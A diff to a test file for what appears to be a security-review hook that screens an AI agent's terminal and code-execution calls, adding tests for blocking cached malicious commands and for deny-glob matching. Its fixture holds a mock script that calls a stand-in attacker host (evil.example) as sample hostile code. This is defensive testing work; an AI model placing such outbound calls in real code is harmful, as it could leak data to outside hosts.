@@ -546,6 +546,14 @@ check("cache: two rows same name, distinct hashes", (len(_rows), len({h for h, _
 # (c) cached MALICIOUS -> zero-LLM escalate; operator Always outranks it
 h4, ctx4 = fresh("enforce", "mal", files={"/scripts/bad.py": "import urllib.request\nurllib.request.urlopen('https://evil.example')"})
 check("cache: malicious verdict -> block", (h4("terminal", {"command": "python3 /scripts/bad.py"}, "z-4") or {}).get("action"), "block")
+# (c2) v0.2.10: identical rerun of a command cached MALICIOUS must BLOCK at
+# the verdict-cache layer, not escalate via the script-cache layer (live
+# battery regression: the escalate sat ahead of the cache and asked the human
+# on a known-bad command, and the approval let it run).
+r4b = h4("terminal", {"command": "python3 /scripts/bad.py"}, "z-4b")
+check("cache: cached MALICIOUS rerun -> zero-LLM block", (r4b or {}).get("action"), "block")
+check("cache: block layer is verdict-cache", log_rows()[-1]["layer"], "verdict-cache")
+check("cache: block spent zero model calls", len(ctx4.llm.calls), 1)
 h5, ctx5 = fresh("enforce", "safe", files={"/scripts/bad.py": "import urllib.request\nurllib.request.urlopen('https://evil.example')"})
 r5 = h5("terminal", {"command": "python3 /scripts/bad.py run"}, "z-5")
 check("cache: cached MALICIOUS -> zero-LLM escalate", (r5 or {}).get("action"), "approve")
@@ -573,16 +581,32 @@ h9, ctx9 = fresh("enforce", "sus")
 check("cache: different command not matched by key",
       (h9("terminal", {"command": "systemctl restart allowlist-unit-two"}, "z-9") or {}).get("action"), "approve")
 
-# (e) deny-glob pre-check: commands core will refuse spend no tokens
-cfgp.write_text((cfgp.read_text() if cfgp.exists() else "") + "approvals:\n  deny:\n    - '*pip3 install*'\n")
+# (e) deny-glob pre-check: commands core will refuse spend no tokens.
+# v0.2.10 fixes (teknium catalog review): terminal-only pass-through;
+# approvals.deny read SPECIFICALLY (yaml, or a fallback anchored on the
+# top-level approvals: key — never the first deny: at any nesting);
+# case-insensitive matching like Hermes.
+cfgp.write_text((cfgp.read_text() if cfgp.exists() else "") +
+                "approvals:\n  deny:\n    - '*pip3 install*'\n" +
+                "notices:\n  deny:\n    - 'some-other-section-glob'\n")
 h10, ctx10 = fresh("enforce", "safe")
-check("deny: matched command -> pass through to core",
+check("deny: matched terminal command -> pass through to core",
       h10("terminal", {"command": "pip3 install requests"}, "z-10"), None)
 check("deny: zero model calls", len(ctx10.llm.calls), 0)
 check("deny: layer logged", log_rows()[-1]["layer"], "deny-glob")
+check("deny: execute_code NEVER deferred (reviewer still judges it)",
+      h10("execute_code", {"code": "pip3 install requests"}, "z-11"), None)
+check("deny: execute_code spent a model call", len(ctx10.llm.calls), 1)
+check("deny: deny: key outside approvals is ignored",
+      h10("terminal", {"command": "some-other-section-glob --run"}, "z-12"), None)
+check("deny: non-approvals glob spent a model call", len(ctx10.llm.calls), 2)
 check("deny: unmatched command still reviewed",
-      h10("terminal", {"command": "uv pip install requests"}, "z-11"), None)
-check("deny: unmatched spent exactly one model call", len(ctx10.llm.calls), 1)
+      h10("terminal", {"command": "uv pip install requests"}, "z-13"), None)
+check("deny: unmatched spent exactly one more model call", len(ctx10.llm.calls), 3)
+check("deny: case-insensitive like Hermes",
+      h10("terminal", {"command": "PIP3 INSTALL requests"}, "z-14"), None)
+check("deny: case-insensitive spent zero model calls", len(ctx10.llm.calls), 3)
+check("deny: case-insensitive layer logged", log_rows()[-1]["layer"], "deny-glob")
 
 # (f) command verdict cache: identical command+script -> zero-LLM pass
 h11, ctx11 = fresh("enforce", "safe", files={"/scripts/vc.py": "print('vc probe')"})
